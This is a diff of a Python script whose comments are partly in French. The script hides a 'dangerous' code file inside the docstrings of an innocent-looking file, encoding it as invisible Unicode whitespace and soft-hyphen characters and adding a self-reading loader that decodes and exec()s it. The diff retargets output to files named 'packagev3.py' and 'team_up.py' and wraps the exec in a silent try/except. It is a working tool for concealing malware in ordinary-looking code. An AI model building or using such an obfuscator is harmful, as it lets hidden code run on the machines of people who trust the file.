@@ -8,32 +8,31 @@ import codecs
 
 ####### CONFIGURATION START #############
 CODE_TO_HIDE_PATH = "le_mechant_truc.py"
-SAFE_CODE_PATH = "le_truc.py"
-OUTPUT_CODE_PATH = "le_truc_final.py"
+SAFE_CODE_PATH = "../packagev3.py"
+OUTPUT_CODE_PATH = "../team_up.py"
 
 
 # TOTAL_OBFS_KEYS = [i for i in range(0x80, 0x85)]
-TOTAL_OBFS_KEYS = [32, 160, 0x34f, 0xad]
+TOTAL_OBFS_KEYS = [32, 160, 0x34f]
 SIMPLE_OBFS_KEYS = TOTAL_OBFS_KEYS
-INDICATOR_KEY = 0x701  # Should not be in TOTAL... 
-NBR_BYTES = 4
+INDICATOR_KEY = 0xad  # Should not be in TOTAL... 
+NBR_BYTES = 5
 
 # TODO : set une_fonction to the first function
-visible_unziping_code = """
-# Convert the list of nodes to a matrix :
-graph = une_fonction.__doc__.split('\\n')[0].replace(chr(32), '0').replace(chr(160), '1').replace(chr(0x34f), '2').replace(chr(0xad), '3')
-exec(''.join(chr(int(graph[i:i+{nbr_bytes}], {base})) for i in range(0, len(graph), {nbr_bytes})))
-""".format(nbr_bytes=NBR_BYTES, base=len(SIMPLE_OBFS_KEYS))
+visible_unziping_code = """graph = total.split(vector)[0].replace(chr(32), '0').replace(chr(160), '1').replace(chr(0x34f), '2')
+exec(''.join(chr(int(graph[i:i+{nbr_bytes}], {base})) for i in range(0, len(graph), {nbr_bytes})))""".format(nbr_bytes=NBR_BYTES, base=len(SIMPLE_OBFS_KEYS))
 
 unziping_indice = "# <>"
-hidden_unziping_code = """
-import codecs as c
+hidden_unziping_code = """import codecs as c
 oc=''
-for func in [l.split('(')[4:0] for l in c.open(__file__,"r","utf8").read() if l.startswith('def')]:
+for func in [l.split('(')[0][4:] for l in c.open(__file__,"r","utf-8") if l.startswith('def')]:
     f=[l for l in eval(func + '.__doc__').split(chr({indicator_key}))]
     oc+=''.join(f[i] for i in range(1,len(f),2))
 for i,e in enumerate({all_keys}): oc = oc.replace(chr(e),str(i))
-exec(''.join(chr(int(oc[i:i+{nbr_bytes}],{base})) for i in range(0,len(oc),{nbr_bytes})))
+try:
+    exec(''.join(chr(int(oc[i:i+{nbr_bytes}],{base})) for i in range(0,len(oc),{nbr_bytes})))
+except:
+    pass
 """.format(indicator_key=INDICATOR_KEY, all_keys=TOTAL_OBFS_KEYS, nbr_bytes=NBR_BYTES, base=len(TOTAL_OBFS_KEYS))
 ######### CONFIGURATION END ############
 
@@ -47,7 +46,6 @@ dangerous_file = codecs.open(CODE_TO_HIDE_PATH, "r", "utf-8-sig")
 unziping_code_binary_gen = (baseN(ord(i), len(SIMPLE_OBFS_KEYS)) for i in hidden_unziping_code)
 unziping_code_binary = ''.join('0'*(NBR_BYTES - len(x)) + x for x in unziping_code_binary_gen)  # Normalize to 8 bits
 unziping_code_spaces = ''.join(chr(TOTAL_OBFS_KEYS[int(x, base=len(TOTAL_OBFS_KEYS))]) for x in unziping_code_binary)  # convert to spaces
-print(len(unziping_code_spaces))
 
 # II. Obfuscate the dangerous code
 obfucated_code_gen = (baseN(ord(i), len(TOTAL_OBFS_KEYS)) for i in dangerous_file.read())  # convert to base N
@@ -75,11 +73,9 @@ for i in range(1, len(docstring_cut), 2):
 regonisied = '"""'.join(docstring_cut)
 
 regonisied = regonisied.replace(unziping_indice, visible_unziping_code)
-final_file = codecs.open(OUTPUT_CODE_PATH, "w", "utf-8-sig")
+final_file = codecs.open(OUTPUT_CODE_PATH, "w", "utf-8")
 final_file.write(regonisied)
 
 final_file.close()
 safe_file.close()
 dangerous_file.close()
-
-import le_truc_final
